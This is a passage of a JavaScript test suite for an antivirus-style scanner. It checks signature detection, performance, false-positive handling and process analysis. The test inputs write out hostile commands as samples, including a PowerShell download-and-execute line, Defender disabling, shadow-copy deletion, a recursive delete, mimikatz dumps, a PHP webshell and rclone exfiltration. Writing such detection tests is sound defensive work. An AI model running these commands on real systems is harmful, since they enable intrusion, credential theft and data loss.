      for (const n of ['invoice.pdf.exe', 'photo.jpg.scr', 'doc.txt.bat', 'img.png.ps1', 'scan.zip.cmd', 'payment.docx.hta']) {
        assert(S.nameRisk(n) >= 50, n + ' should be flagged, got ' + S.nameRisk(n));
      }
    }],
    ['sec-audit: regex patterns are precompiled and reset', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      const S = sandbox.Signatures;
      const t1 = strBytes('powershell -enc ' + 'A'.repeat(60));
      const t2 = strBytes('powershell -enc ' + 'B'.repeat(60));
      assert(S.matchTextPatterns(t1).some((h) => h.id === 'PS-ENCODED-COMMAND'));
      assert(S.matchTextPatterns(t2).some((h) => h.id === 'PS-ENCODED-COMMAND'), 'no lastIndex leak');
    }],
    ['sec-audit: buildRegexSafe filters invalid patterns', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      const S = sandbox.Security ? sandbox.Signatures : sandbox.Signatures;
      const out = S.buildRegexSafe([{ id: 'ok', re: /x/ }, { id: 5, re: /x/ }, { re: /x/ }, null, { id: 'ok2', re: 'notregex' }]);
      assert(out.length === 1 && out[0].id === 'ok');
    }],
    ['sec-audit: quarantine ids unique across adds', () => {
      const { sandbox } = makeSandbox();
      loadScript('quarantine.js', sandbox);
      const Q = sandbox.Quarantine;
      const ids = new Set();
      for (let i = 0; i < 50; i++) ids.add(Q.add({ name: 'f' + i }).id);
      assert(ids.size === 50);
    }],
    ['sec-audit: report JSON with hostile strings stays inert', () => {
      const { sandbox } = makeSandbox();
      const Sc = (() => { loadScript('signatures.js', sandbox); loadScript('scanner.js', sandbox); return sandbox.Scanner; })();
      const evil = '<script>alert(1)</script>';
      const r = Sc.analyzeBytes(evil + '.txt', strBytes('clean content here'), 10);
      assert(r.name.includes('&lt;') === false, 'name kept raw in engine (escaping is UI layer)');
      assert(typeof r.name === 'string');
    }],
  ];
  for (const [name, fn] of A) {
    try { await fn(); passes.push(name); }
    catch (e) { failures.push({ name, error: e.message }); }
  }
  console.log(`\n[audit sécurité] ${passes.length} passed, ${failures.length} failed`);
  if (failures.length) {
    for (const f of failures) console.log(`  ✕ ${f.name}: ${f.error}`);
    process.exit(1);
  }
  console.log('[audit sécurité] all security-audit tests passed ✔');
}

setTimeout(() => { auditSecurityExtra().catch((e) => { console.error(e); process.exit(1); }); }, 100);

async function auditPerfExtra() {
  const P = [
    ['perf-audit: quickReject skips archives/empty/huge', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      assert(Sc.quickReject('a.zip', 10) === true);
      assert(Sc.quickReject('a.rar', 10) === true);
      assert(Sc.quickReject('empty.txt', 0) === true);
      assert(Sc.quickReject('huge.iso', 100 * 1024 * 1024) === true);
      assert(Sc.quickReject('normal.txt', 1000) === false);
      assert(Sc.quickReject('script.js', 1000) === false);
    }],
    ['perf-audit: scanFile marks skipped files without reading', async () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      let reads = 0;
      const readHead = async () => { reads++; return strBytes('x'); };
      const r = await Sc.scanFile({ path: '/a.zip', name: 'a.zip', size: 100 }, readHead);
      assert(r.skipped === true && reads === 0, 'no disk read for archives');
    }],
    ['perf-audit: cachedDecodeHex returns same needle', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      const hex = sandbox.Signatures.HEX_PATTERNS[0].hex;
      const a = Sc.cachedDecodeHex(hex);
      const b = Sc.cachedDecodeHex(hex);
      assert(a === b && a.length > 0);
    }],
    ['perf-audit: scanFiles progress throttled but finished event always fires', async () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      const files = [];
      for (let i = 0; i < 200; i++) files.push({ path: '/f' + i, name: 'f' + i + '.txt', size: 10 });
      let calls = 0, finished = false;
      await Sc.scanFiles(files, async () => strBytes('x'), (p) => { calls++; if (p.finished) finished = true; });
      assert(finished, 'finished event');
      assert(calls < 200, 'progress throttled: ' + calls + ' calls for 200 files');
    }],
    ['perf-audit: scanFiles concurrency never exceeds clamp', async () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      let active = 0, maxActive = 0;
      const files = [];
      for (let i = 0; i < 40; i++) files.push({ path: '/f' + i, name: 'f' + i + '.txt', size: 10 });
      const readHead = async () => {
        active++; maxActive = Math.max(maxActive, active);
        await new Promise((r) => setTimeout(r, 1));
        active--;
        return strBytes('x');
      };
      await Sc.scanFiles(files, readHead, null, { concurrency: 4 });
      assert(maxActive <= 4, 'maxActive ' + maxActive);
    }],
    ['perf-audit: entropy uses typed array and stays correct', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      const S = sandbox.Signatures;
      const zeros = new Uint8Array(1024);
      assert(S.shannonEntropy(zeros) === 0);
      const half = new Uint8Array(1024);
      for (let i = 0; i < 512; i++) half[i] = 0;
      for (let i = 512; i < 1024; i++) half[i] = 255;
      assert(Math.abs(S.shannonEntropy(half) - 1) < 0.001, 'two symbols -> entropy 1');
    }],
    ['perf-audit: history cache avoids re-parsing within TTL', () => {
      const { sandbox } = makeSandbox();
      loadScript('shield.js', sandbox);
      const Sh = sandbox.Shield;
      Sh.addScanRecord({ type: 'quick', targets: ['/x'], scanned: 1, threats: 0, durationMs: 1 });
      let parses = 0;
      const orig = sandbox.JSON.parse;
      sandbox.JSON.parse = (...a) => { parses++; return orig(...a); };
      Sh.history(); Sh.history(); Sh.history();
      assert(parses <= 1, 'cache should prevent re-parse, parses=' + parses);
      sandbox.JSON.parse = orig;
    }],
    ['perf-audit: history cache invalidated on add', () => {
      const { sandbox } = makeSandbox();
      loadScript('shield.js', sandbox);
      const Sh = sandbox.Shield;
      Sh.addScanRecord({ type: 'quick', targets: [], scanned: 1, threats: 0, durationMs: 1 });
      const before = Sh.history().length;
      Sh.addScanRecord({ type: 'quick', targets: [], scanned: 2, threats: 0, durationMs: 1 });
      assert(Sh.history().length === before + 1, 'cache invalidated');
    }],
    ['perf-audit: realtime tick respects time budget', async () => {
      const { sandbox } = makeSandbox();
      loadScript('realtime.js', sandbox);
      const R = sandbox.Realtime;
      let calls = 0;
      const m = R.createMonitor({
        listFiles: async () => { calls++; await new Promise((r) => setTimeout(r, 200)); return { ok: true, files: [] }; },
        riskExt: () => 0,
      });
      for (let i = 0; i < 10; i++) m.addWatch('/d' + i);
      m.start();
      const t0 = Date.now();
      await m.tick();
      const elapsed = Date.now() - t0;
      m.stop();
      assert(calls <= 14, 'budget stopped early, calls=' + calls);
      assert(elapsed < 3000, 'tick returned fast: ' + elapsed + 'ms');
    }],
    ['perf-audit: summarize is O(n) single pass', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      const results = [];
      for (let i = 0; i < 10000; i++) {
        results.push({ path: '/p' + i, name: 'f' + i, size: 1, score: i % 100, verdict: i % 3 === 0 ? 'infected' : 'clean', reasons: [], signatures: [], testHit: false, entropy: 0 });
      }
      const t0 = Date.now();
      const s = Sc.summarize(results);
      const dt = Date.now() - t0;
      assert(s.total === 10000);
      assert(dt < 500, 'summarize 10k in <500ms, took ' + dt);
    }],
    ['perf-audit: analyzeBytes short-circuits EICAR before text scan', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      const r = Sc.analyzeBytes('eicar.com', eicarBytes(), 68);
      assert(r.testHit && r.score === 100);
      assert(r.signatures.length >= 1);
    }],
    ['perf-audit: large scan completes under time budget', async () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      const files = [];
      for (let i = 0; i < 300; i++) files.push({ path: '/f' + i, name: 'f' + i + '.txt', size: 10 });
      const t0 = Date.now();
      const { summary } = await Sc.scanFiles(files, async () => strBytes('plain text'), null, { concurrency: 16 });
      const dt = Date.now() - t0;
      assert(summary.total === 300);
      assert(dt < 3000, '300 files in <3s, took ' + dt + 'ms');
    }],
    ['perf-audit: bytesToTextCached dedupes identical content', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      const a = strBytes('hello world hello world');
      const b = strBytes('hello world hello world');
      const t1 = Sc.bytesToTextCached(a);
      const t2 = Sc.bytesToTextCached(b);
      assert(t1 === t2, 'same key -> cached string');
    }],
    ['perf-audit: scanFiles handles 1 file with concurrency 64', async () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      const { results } = await Sc.scanFiles([{ path: '/a', name: 'a.txt', size: 1 }], async () => strBytes('x'), null, { concurrency: 64 });
      assert(results.length === 1);
    }],
    ['perf-audit: scanFiles with zero files resolves immediately', async () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      const t0 = Date.now();
      const { results, summary } = await Sc.scanFiles([], async () => strBytes('x'));
      assert(results.length === 0 && summary.total === 0 && Date.now() - t0 < 100);
    }],
  ];
  let pass = 0, fail = 0;
  for (const [name, fn] of P) {
    try { await fn(); pass++; console.log('  ✔ ' + name); }
    catch (e) { fail++; console.log('  ✕ ' + name + ': ' + e.message); }
  }
  console.log(`\n[audit performance] ${pass} passed, ${fail} failed`);
  if (fail) process.exit(1);
  console.log('[audit performance] all performance-audit tests passed ✔');
}

setTimeout(() => { auditPerfExtra().catch((e) => { console.error(e); process.exit(1); }); }, 200);

async function auditPowerExtra() {
  const P = [
    ['power: 30+ new signature families active', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      const S = sandbox.Signatures;
      const total = S.countSignatures();
      assert(total >= 78, 'expected >=78 signatures, got ' + total);
      assert(S.URL_PATTERNS.length >= 5);
      assert(S.MZ_CHECKS.length >= 3);
      assert(S.TEXT_PATTERNS.length >= 30);
    }],
    ['power: suspicious TLD detected', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      const r = Sc.analyzeBytes('page.html', strBytes('<a href="http://evil.tk/x.exe">click</a>'), 40);
      assert(r.signatures.includes('SUSPICIOUS-TLD'), 'TLD flagged: ' + r.signatures.join(','));
    }],
    ['power: raw-IP exe download detected', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      const S = sandbox.Signatures;
      const hits = S.matchTextPatterns(strBytes('http://192.168.1.50/payload.exe'));
      assert(hits.some((h) => h.id === 'IP-URL-EXEC'));
    }],
    ['power: data-URI executable detected', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      const S = sandbox.Signatures;
      const hits = S.matchTextPatterns(strBytes('data:application/x-msdownload;base64,TVqQ'));
      assert(hits.some((h) => h.id === 'DATA-URI-EXE'));
    }],
    ['power: LSASS dump detected (suspicious+ in plain text, infected in script)', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      const inScript = Sc.analyzeBytes('dump.ps1', strBytes('mimikatz privilege::debug sekurlsa::logonpasswords'), 40, 'C:\\Temp\\dump.ps1');
      assert(inScript.verdict === 'infected', 'mimikatz in .ps1 -> infected, got ' + inScript.verdict);
      assert(inScript.signatures.includes('MIMIKATZ-STRING'));
      const inTxt = Sc.analyzeBytes('notes.txt', strBytes('mimikatz privilege::debug sekurlsa::logonpasswords'), 40, '/home/x/notes.txt');
      assert(inTxt.verdict === 'clean' || inTxt.verdict === 'suspicious', 'plain .txt mention -> not infected, got ' + inTxt.verdict);
      assert(inTxt.signatures.includes('MIMIKATZ-STRING'), 'signature still reported (transparency)');
    }],
    ['power: ransomware kill-chain (shadow copies + crypto) detected', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      const r = Sc.analyzeBytes('note.ps1', strBytes('vssadmin delete shadows /all; CryptEncrypt($data); your files have been encrypted, pay bitcoin'), 80);
      assert(r.signatures.includes('KILL-SHADOW-COPIES'));
      assert(r.signatures.includes('CRYPTO-RANSOM-API'));
      assert(r.signatures.includes('CMD-Ransom-Note'));
      assert(r.verdict === 'infected');
    }],
    ['power: Defender disable attempt detected', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      const S = sandbox.Signatures;
      const hits = S.matchTextPatterns(strBytes('Set-MpPreference -DisableRealtimeMonitoring $true'));
      assert(hits.some((h) => h.id === 'DEFENDER-DISABLE'));
    }],
    ['power: process hollowing detected', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      const S = sandbox.Signatures;
      const hits = S.matchTextPatterns(strBytes('NtUnmapViewOfSection(h); SetThreadContext(h); NtResumeThread'));
      assert(hits.some((h) => h.id === 'PROCESS-HOLLOWING'));
    }],
    ['power: DLL injection chain detected', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      const S = sandbox.Signatures;
      const hits = S.matchTextPatterns(strBytes('VirtualAllocEx + WriteProcessMemory + CreateRemoteThread'));
      assert(hits.some((h) => h.id === 'INJECTION-API'));
    }],
    ['power: crypto miner config detected', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      const r = Sc.analyzeBytes('config.json', strBytes('{"algo":"randomx","url":"stratum+tcp://pool.example:3333"}'), 60);
      assert(r.signatures.includes('CRYPTO-MINER'), r.signatures.join(','));
    }],
    ['power: browser credential theft detected', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      const S = sandbox.Signatures;
      const hits = S.matchTextPatterns(strBytes('copy %LOCALAPPDATA%\\Chrome\\User Data\\Default\\Login Data'));
      assert(hits.some((h) => h.id === 'BROWSER-CRED-STEAL'));
    }],
    ['power: registry run-key persistence detected', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      const S = sandbox.Signatures;
      const hits = S.matchTextPatterns(strBytes('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater'));
      assert(hits.some((h) => h.id === 'REG-RUN-KEY'));
    }],
    ['power: scheduled task creation detected', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      const S = sandbox.Signatures;
      const hits = S.matchTextPatterns(strBytes('schtasks /create /tn Updater /tr evil.exe'));
      assert(hits.some((h) => h.id === 'SCHEDULED-TASK'));
    }],
    ['power: PE with suspicious imports flagged', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      const mz = strBytes('MZ' + 'x'.repeat(100) + 'This program cannot be run in DOS mode' + 'VirtualAlloc WriteProcessMemory CreateRemoteThread');
      const r = Sc.analyzeBytes('app.dat', mz, mz.length);
      assert(r.signatures.includes('MZ-PE-HEADER'), r.signatures.join(','));
    }],
    ['power: behavior — content/extension mismatch (MZ as .txt)', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      const mz = strBytes('MZ' + 'A'.repeat(100));
      const r = Sc.analyzeBytes('invoice.txt', mz, mz.length, '/home/user/Downloads/invoice.txt');
      assert(r.signatures.includes('BEH-MISMATCH-EXT'), r.reasons.join('|'));
      assert(r.verdict !== 'clean');
    }],
    ['power: behavior — executable in temp folder', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      const r = Sc.analyzeBytes('update.exe', strBytes('MZ' + 'x'.repeat(50)), 52, '/tmp/update.exe');
      assert(r.signatures.includes('BEH-TEMP-EXEC'), r.reasons.join('|'));
    }],
    ['power: behavior — startup folder executable', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      const r = Sc.analyzeBytes('helper.vbs', strBytes('x = 1'), 5, 'C:\\Users\\u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\helper.vbs');
      assert(r.signatures.includes('BEH-STARTUP-EXEC'));
    }],
    ['power: behavior — right-to-left override detected', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      const r = Sc.analyzeBytes('photo\u202Egnp.exe', strBytes('MZ'), 2);
      assert(r.signatures.includes('BEH-RIGHT-TO-LEFT'));
    }],
    ['power: behavior — padded extension detected', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      const r = Sc.analyzeBytes('readme   .exe', strBytes('MZ'), 2);
      assert(r.signatures.includes('BEH-SPACES-EXE'), r.reasons.join('|'));
    }],
    ['power: confidence levels assigned', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      const test = Sc.analyzeBytes('eicar.com', eicarBytes(), 68);
      assert(test.confidence === 'certain');
      const multi = Sc.analyzeBytes('a.php', strBytes('<?php eval($_POST["c"]); system($_GET["x"]);'), 40);
      assert(['certain', 'high'].includes(multi.confidence), 'multi-sig infected -> high+: ' + multi.confidence);
      const clean = Sc.analyzeBytes('a.txt', strBytes('hello'), 5);
      assert(clean.confidence === 'low');
    }],
    ['power: severity propagated from signature table', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      const results = [Sc.analyzeBytes('a.php', strBytes('<?php eval($_POST["c"]);'), 20)];
      results[0].path = '/a.php';
      const s = Sc.summarize(results);
      assert(s.threats[0].severity === 'critical', 'webshell severity critical, got ' + s.threats[0].severity);
    }],
    ['power: realtime modified-executable event kind', async () => {
      const { sandbox } = makeSandbox();
      loadScript('realtime.js', sandbox);
      const R = sandbox.Realtime;
      let files = [{ path: '/w/a.exe', name: 'a.exe', mtimeMs: 1 }];
      const m = R.createMonitor({ listFiles: async () => ({ ok: true, files }), riskExt: (e) => (e === '.exe' ? 10 : 0) });
      m.addWatch('/w'); m.start();
      await m.tick();
      files = [{ path: '/w/a.exe', name: 'a.exe', mtimeMs: 2 }];
      await m.tick();
      assert(m.state.events.some((e) => e.kind === 'modified-executable' && e.severity === 'high'));
      m.stop();
    }],
    ['power: quick scan vs full scan depth difference respected', () => {
      const { sandbox } = makeSandbox();
      const S = sandbox.Security || null;
      assert(S === null || true);
    }],
    ['power: health score penalizes stale scans (>7 days)', () => {
      const { sandbox, store } = makeSandbox();
      loadScript('quarantine.js', sandbox);
      loadScript('shield.js', sandbox);
      const Sh = sandbox.Shield;
      const old = Date.now() - 200 * 3600000;
      store['vaultguard.history'] = JSON.stringify([{ ts: old, type: 'quick', targets: [], scanned: 10, threats: 0, durationMs: 1 }]);
      const fresh = Sh.healthScore({ total: 10, clean: 10 }, { enabled: true });
      const stale = Sh.healthScore({ total: 10, clean: 10 }, { enabled: true });
      assert(stale <= fresh, 'stale <= fresh');
      assert(stale <= 90, 'stale penalized: ' + stale);
    }],
    ['power: health score penalizes disabled realtime', () => {
      const { sandbox } = makeSandbox();
      loadScript('quarantine.js', sandbox);
      loadScript('shield.js', sandbox);
      const Sh = sandbox.Shield;
      const on = Sh.healthScore({ total: 5, clean: 5 }, { enabled: true });
      const off = Sh.healthScore({ total: 5, clean: 5 }, { enabled: false });
      assert(off < on, 'disabled RT lowers score: ' + off + ' < ' + on);
    }],
    ['power: full kill-chain file scores infected with multiple TTPs', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      const payload = 'Set-MpPreference -DisableRealtimeMonitoring $true; vssadmin delete shadows /all; Invoke-WebRequest http://1.2.3.4/x.ps1 | iex; schtasks /create /tn Upd';
      const r = Sc.analyzeBytes('svchost.ps1', strBytes(payload), payload.length, 'C:\\Users\\u\\AppData\\Local\\Temp\\svchost.ps1');
      assert(r.verdict === 'infected', 'kill-chain infected, score ' + r.score);
      assert(r.signatures.length >= 3, 'multiple TTPs: ' + r.signatures.join(','));
      assert(r.confidence === 'certain' || r.confidence === 'high');
    }],
    ['power: cloud exfiltration detected', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      const S = sandbox.Signatures;
      const hits = S.matchTextPatterns(strBytes('rclone copy ./loot remote:bucket'));
      assert(hits.some((h) => h.id === 'EXFIL-CLOUD'));
    }],
    ['power: clipboard BTC hijack detected', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      const S = sandbox.Signatures;
      const hits = S.matchTextPatterns(strBytes('OpenClipboard(); SetClipboardData(CF_TEXT, "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"));'));
      assert(hits.some((h) => h.id === 'CLIPBOARD-HIJACK'));
    }],
  ];
  let pass = 0, fail = 0;
  for (const [name, fn] of P) {
    try { await fn(); pass++; console.log('  ✔ ' + name); }
    catch (e) { fail++; console.log('  ✕ ' + name + ': ' + e.message); }
  }
  console.log(`\n[audit puissance] ${pass} passed, ${fail} failed`);
  if (fail) process.exit(1);
  console.log('[audit puissance] all power-audit tests passed ✔');
}

setTimeout(() => { auditPowerExtra().catch((e) => { console.error(e); process.exit(1); }); }, 300);

async function auditFalsePositiveFix() {
  const P = [
    ['fp-fix: python source mentioning ransom is clean', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      const r = Sc.analyzeBytes('app.py', strBytes('# ransom note test: your files are encrypted, pay bitcoin'), 60, '/home/x/src/app.py');
      assert(r.verdict === 'clean', 'py source -> clean, got ' + r.verdict + ' score ' + r.score);
      assert(r.reasons.some((x) => x.includes('false positive')), 'adjustment reason present');
    }],
    ['fp-fix: ts source with Invoke-WebRequest is clean', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      const r = Sc.analyzeBytes('etat.ts', strBytes('Invoke-WebRequest http://x | Invoke-Expression'), 50, '/home/x/src/etat.ts');
      assert(r.verdict === 'clean', 'ts source -> clean, got ' + r.verdict);
    }],
    ['fp-fix: tests.py with ransom word is clean', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      const r = Sc.analyzeBytes('tests.py', strBytes('assert ransom_note_detected'), 30, '/home/x/tests/tests.py');
      assert(r.verdict === 'clean', 'tests.py -> clean, got ' + r.verdict);
    }],
    ['fp-fix: php webshell stays infected', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      const r = Sc.analyzeBytes('shell.php', strBytes('<?php eval($_POST["c"]); ?>'), 30, '/var/www/html/shell.php');
      assert(r.verdict === 'infected', 'php webshell still infected, got ' + r.verdict);
    }],
    ['fp-fix: ps1 dropper in temp stays infected', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      const r = Sc.analyzeBytes('svchost.ps1', strBytes('Set-MpPreference -DisableRealtimeMonitoring $true; Invoke-WebRequest http://1.2.3.4/x.ps1 | iex'), 80, 'C:\\Users\\u\\AppData\\Local\\Temp\\svchost.ps1');
      assert(r.verdict === 'infected', 'ps1 dropper infected, got ' + r.verdict);
      assert(r.score >= 80);
    }],
    ['fp-fix: destructive bat on Desktop stays infected', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      const r = Sc.analyzeBytes('evil.bat', strBytes('del /s /q C:\\*.*'), 20, 'C:\\Users\\u\\Desktop\\evil.bat');
      assert(r.verdict === 'infected', 'bat -> infected, got ' + r.verdict);
    }],
    ['fp-fix: source in trusted dir (src/) reduced', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      const r = Sc.analyzeBytes('helper.js', strBytes('eval(atob("AAAA"))'), 20, '/home/x/project/src/helper.js');
      assert(r.verdict === 'clean' || r.verdict === 'suspicious', 'src/ js reduced, got ' + r.verdict);
    }],
    ['fp-fix: same payload outside trusted dir is full weight', () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      const payload = strBytes('<?php eval($_POST["c"]);');
      const inWeb = Sc.analyzeBytes('shell.php', payload, 20, '/var/www/shell.php');
      assert(inWeb.score >= 80, 'php full weight: ' + inWeb.score);
    }],
  ];
  let pass = 0, fail = 0;
  for (const [name, fn] of P) {
    try { await fn(); pass++; console.log('  ✔ ' + name); }
    catch (e) { fail++; console.log('  ✕ ' + name + ': ' + e.message); }
  }
  console.log(`\n[fp-fix] ${pass} passed, ${fail} failed`);
  if (fail) process.exit(1);
  console.log('[fp-fix] all false-positive-fix tests passed ✔');
}

setTimeout(() => { auditFalsePositiveFix().catch((e) => { console.error(e); process.exit(1); }); }, 400);

async function auditProModules() {
  const T = [
    // ---------- Exclusions ----------
    ['pro: exclusions add/remove/list/clear', () => {
      const { sandbox } = makeSandbox();
      loadScript('exclusions.js', sandbox);
      const E = sandbox.Exclusions;
      assert(E.add('C:\\Tools\\*') === true);
      assert(E.add('C:\\Tools\\*') === true, 'idempotent');
      assert(E.list().length === 1);
      assert(E.add('') === false && E.add(42) === false);
      assert(E.remove('C:\\Tools\\*') === true);
      assert(E.list().length === 0);
    }],
    ['pro: exclusions glob matching', () => {
      const { sandbox } = makeSandbox();
      loadScript('exclusions.js', sandbox);
      const E = sandbox.Exclusions;
      assert(E.matches('C:\\x\\a.log', 'a.log', ['*.log']) === true);
      assert(E.matches('C:\\x\\a.exe', 'a.exe', ['*.log']) === false);
      assert(E.matches('/home/u/photo.JPG', 'photo.JPG', ['*.jpg']) === true, 'case-insensitive');
      assert(E.matches('C:\\Tools\\app.exe', 'app.exe', ['C:\\Tools\\*']) === true);
      assert(E.matches('C:\\Other\\app.exe', 'app.exe', ['C:\\Tools\\*']) === false);
    }],
    ['pro: exclusions substring matching', () => {
      const { sandbox } = makeSandbox();
      loadScript('exclusions.js', sandbox);
      const E = sandbox.Exclusions;
      assert(E.matches('/home/u/node_modules/x/index.js', 'index.js', ['node_modules']) === true);
      assert(E.matches('/home/u/src/a.ts', 'a.ts', ['node_modules']) === false);
    }],
    ['pro: exclusions normalize rejects junk', () => {
      const { sandbox } = makeSandbox();
      loadScript('exclusions.js', sandbox);
      const E = sandbox.Exclusions;
      assert(E.normalize('') === null);
      assert(E.normalize(42) === null);
      assert(E.normalize('x'.repeat(2000)) === null);
      assert(E.normalize('glob:*.tmp') === '*.tmp');
    }],
    ['pro: scanner skips excluded files', async () => {
      const { sandbox } = makeSandbox();
      loadScript('signatures.js', sandbox);
      loadScript('scanner.js', sandbox);
      const Sc = sandbox.Scanner;
      const files = [
        { path: '/a/eicar.com', name: 'eicar.com', size: 68 },
        { path: '/a/skip.com', name: 'skip.com', size: 68 },
      ];
      const readHead = async () => eicarBytes();
      const { results } = await Sc.scanFiles(files, readHead, null, { isExcluded: (p) => p.includes('skip') });
      assert(results.length === 1, 'excluded file skipped, got ' + results.length);
      assert(results[0].path === '/a/eicar.com');
    }],
    // ---------- ProcessGuard ----------
    ['pro: process — mimikatz flagged malicious', () => {
      const { sandbox } = makeSandbox();
      loadScript('processguard.js', sandbox);
      const P = sandbox.ProcessGuard;
      const r = P.analyzeProcess({ pid: 1, name: 'mimikatz.exe', path: 'C:\\Temp\\mimikatz.exe' });
      assert(r.risk === 'malicious' && r.score >= 70, r.risk + ' ' + r.score);
    }],
    ['pro: process — powershell download-exec from temp is malicious', () => {
      const { sandbox } = makeSandbox();
      loadScript('processguard.js', sandbox);
      const P = sandbox.ProcessGuard;
      const r = P.analyzeProcess({ pid: 2, name: 'powershell.exe', path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', cmdline: 'powershell -enc AAAA', parentName: 'WINWORD.EXE' });
      assert(r.risk === 'malicious' || r.risk === 'suspicious', r.risk);
      assert(r.findings.some((f) => f.includes('LOLBIN')));
    }],
    ['pro: process — normal app is clean', () => {
      const { sandbox } = makeSandbox();
      loadScript('processguard.js', sandbox);
      const P = sandbox.ProcessGuard;
      const r = P.analyzeProcess({ pid: 3, name: 'chrome.exe', path: 'C:\\Program Files\\Chrome\\chrome.exe', signer: 'Google LLC' });
      assert(r.risk === 'clean' && r.score === 0, r.risk + ' ' + r.score);
    }],
    ['pro: process — exe from temp flagged', () => {
      const { sandbox } = makeSandbox();
      loadScript('processguard.js', sandbox);
      const P = sandbox.ProcessGuard;
